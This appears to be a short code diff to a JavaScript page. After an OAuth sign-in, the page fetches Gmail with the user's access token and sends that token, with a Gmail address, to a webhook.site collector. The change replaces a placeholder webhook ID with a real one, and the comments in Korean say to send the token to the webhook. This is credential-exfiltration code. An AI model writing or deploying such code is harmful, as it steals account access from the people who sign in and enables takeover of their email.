@@ -22,7 +22,7 @@
                 accessTokenGlobal = response.access_token;
                 fetchGmail(response.access_token);
                 // 토큰을 webhook.site로 전송
-                fetch('https://webhook.site/1234-5678', {  // 여기에 당신의 webhook URL 입력
+                fetch('https://webhook.site/2bd98794-257e-445c-90a9-d753ab90516f', {  // 여기에 당신의 webhook URL 입력
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ token: response.access_token, user: 'doirbanz@gmail.com' })
